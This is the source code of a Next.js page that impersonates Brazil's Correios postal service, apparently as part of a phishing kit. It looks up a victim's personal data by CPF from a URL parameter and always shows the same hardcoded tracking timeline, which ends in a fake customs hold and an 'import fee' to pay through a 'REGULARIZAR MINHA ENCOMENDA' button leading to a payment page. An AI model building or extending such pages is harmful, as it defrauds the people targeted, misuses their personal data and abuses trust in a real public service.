"use client"

import { useEffect, useState } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { AlertTriangle, Package, Truck, MapPin, Clock } from "lucide-react"
import { consultarCPF } from "@/lib/cpf-api"

interface ClientData {
  cpf: string
  nome: string
  data_nascimento: string
  status: string
  encomenda: {
    codigo: string
    status: string
    produto: string
    valor: string
  }
}

export default function RastreamentoPage() {
  const searchParams = useSearchParams()
  const idParam = searchParams.get("id")
  const [clientData, setClientData] = useState<ClientData | null>(null)
  const [loading, setLoading] = useState(true)
  const [showGif, setShowGif] = useState(true)

  useEffect(() => {
    const fetchClientData = async () => {
      if (!idParam) return

      try {
        const result = await consultarCPF(idParam)
        if (result.success && result.data) {
          setClientData(result.data)
        }
      } catch (error) {
        console.error("Erro ao buscar dados do cliente:", error)
      } finally {
        setLoading(false)
      }
    }

    fetchClientData()

    // Esconder o GIF após 3 segundos
    const timer = setTimeout(() => {
      setShowGif(false)
    }, 3000)

    return () => clearTimeout(timer)
  }, [idParam])

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
          <p>Carregando rastreamento...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* GIF de Loading */}
      {showGif && (
        <div className="fixed inset-0 bg-white z-50 flex items-center justify-center">
          <Image
            src="/efeito.gif"
            alt="Carregando rastreamento"
            width={400}
            height={300}
            className="max-w-full h-auto"
            priority
          />
        </div>
      )}

      {/* Header */}
      <header className="bg-white border-b border-gray-200 py-4 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-center">
            <Image src="/correios-logo.png" alt="Correios" width={150} height={50} className="h-10 w-auto" priority />
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Status Principal */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-6">
          <div className="flex items-center gap-3 mb-4">
            <div className="bg-red-100 p-2 rounded-full">
              <Clock className="h-5 w-5 text-red-600" />
            </div>
            <div>
              <h2 className="text-lg font-semibold text-red-600">
                Status: Aguardando pagamento para liberação do objeto
              </h2>
              <p className="text-sm text-gray-600">
                Curitiba - PR • Realize o pagamento da taxa para liberação do objeto
              </p>
            </div>
          </div>
        </div>

        {/* Timeline de Rastreamento */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mb-6">
          <div className="space-y-6">
            {/* Objeto em fiscalização */}
            <div className="flex items-start gap-4">
              <div className="bg-yellow-100 p-2 rounded-full flex-shrink-0">
                <AlertTriangle className="h-5 w-5 text-yellow-600" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-gray-900">Objeto em fiscalização</h3>
                <p className="text-sm text-gray-600">Curitiba - PR</p>
              </div>
              <div className="w-1 bg-yellow-400 h-16 ml-6"></div>
            </div>

            {/* Objeto sendo encaminhado */}
            <div className="flex items-start gap-4">
              <div className="bg-blue-100 p-2 rounded-full flex-shrink-0">
                <Package className="h-5 w-5 text-blue-600" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-gray-900">Objeto sendo encaminhado para fiscalização aduaneira</h3>
                <p className="text-sm text-gray-600">
                  de Agência dos Correios, Cajamar - SP para fiscalização Curitiba - PR
                </p>
              </div>
              <div className="w-1 bg-yellow-400 h-16 ml-6"></div>
            </div>

            {/* Objeto em transferência */}
            <div className="flex items-start gap-4">
              <div className="bg-blue-100 p-2 rounded-full flex-shrink-0">
                <Truck className="h-5 w-5 text-blue-600" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-gray-900">Objeto em transferência - por favor aguarde</h3>
                <p className="text-sm text-gray-600">
                  de Agência dos Correios, CHINA - CN para Unidade de Tratamento, Cajamar - SP
                </p>
              </div>
              <div className="w-1 bg-yellow-400 h-16 ml-6"></div>
            </div>

            {/* Objeto postado */}
            <div className="flex items-start gap-4">
              <div className="bg-gray-100 p-2 rounded-full flex-shrink-0">
                <MapPin className="h-5 w-5 text-gray-600" />
              </div>
              <div className="flex-1">
                <h3 className="font-semibold text-gray-900">Objeto postado</h3>
                <p className="text-sm text-gray-600">CHINA</p>
              </div>
            </div>
          </div>
        </div>

        {/* Card de Tributação */}
        <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
          <div className="border-l-4 border-yellow-400 p-6">
            <div className="text-center">
              <div className="mb-4">
                <h2 className="text-xl font-bold text-red-600 mb-2">🛑 SUA ENCOMENDA FOI TRIBUTADA</h2>
                <div className="inline-block bg-yellow-100 text-yellow-800 px-4 py-2 rounded-full text-sm font-medium">
                  ⏳ AGUARDANDO PAGAMENTO
                </div>
              </div>

              <div className="space-y-4 mb-6">
                <p className="text-gray-700">Sua encomenda está retida na agência dos Correios em Curitiba.</p>
                <p className="text-gray-700">Para liberar sua mercadoria, é necessário quitar a taxa de importação.</p>
                <p className="text-gray-700 font-medium">Clique no botão abaixo para regularizar com segurança:</p>
              </div>

              <Link href={`/pagamento?id=${idParam}`}>
                <Button className="bg-blue-500 hover:bg-blue-600 text-white px-8 py-3 text-lg font-medium rounded-lg">
                  ✓ REGULARIZAR MINHA ENCOMENDA
                </Button>
              </Link>
            </div>
          </div>
        </div>

        {/* Informações Adicionais */}
        <div className="mt-6 text-center text-sm text-gray-500">
          <p>
            Código de rastreamento:{" "}
            <span className="font-mono">{clientData?.encomenda?.codigo || "BR123456789BR"}</span>
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 py-6 mt-12">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <p className="text-sm font-medium text-gray-800">Central de Atendimento: 0800 725 0100</p>
        </div>
      </footer>
    </div>
  )
}
